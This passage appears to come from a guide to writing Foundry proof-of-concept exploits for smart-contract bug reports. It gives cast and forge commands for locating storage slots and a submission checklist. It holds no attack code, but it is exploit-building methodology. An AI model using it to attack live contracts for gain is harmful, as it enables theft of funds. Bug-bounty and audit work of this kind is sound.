
### Finding Storage Slots for vm.store()

When you need to use `vm.store()` (on out-of-scope contracts only), find the correct slot:

```bash
# View full storage layout of a contract
forge inspect VulnerableContract storage-layout

# Compute storage slot for a mapping: mapping(address => uint256) at slot 0
# slot = keccak256(abi.encode(address, uint256(0)))
cast index address 0xYourAddress 0

# Read a storage slot on-chain to verify
cast storage 0xContractAddress 0x<slot> --rpc-url $MAINNET_RPC_URL
```

---

## Checklist Before Submitting

Quick checks:

- [ ] PoC runs with `forge test` without errors
- [ ] Attacker starts with realistic resources (just gas + maybe some tokens)
- [ ] No `vm.store()` on target contract (unless justified)
- [ ] Console logs show before/after state clearly
- [ ] Reduce Console logs to what is only important for the judger to understand the exploit
- [ ] Assertions prove the exploit worked
- [ ] Gas cost is reasonable (under block gas limit of 30M; most exploits should be <10M)
- [ ] Works on mainnet fork with real addresses or the realistic local deployment
- [ ] No unnecessary complexity - keep it as simple as possible to demonstrate the bug
- [ ] Code is minimal - no unnecessary complexity

---

## Summary

**For most bugs:** Use **Value Extraction Template**
**For access control / invariant bugs:** Use **Invariant Break Template**

**Keep it simple:**
1. Setup realistic state
2. Execute the exploit
3. Show the impact with console.logs
4. Verify with assertions

**The PoC should answer one question:**
"Can an attacker with no special privileges exploit this to cause real harm?"

If the answer is yes, you've written a good PoC.
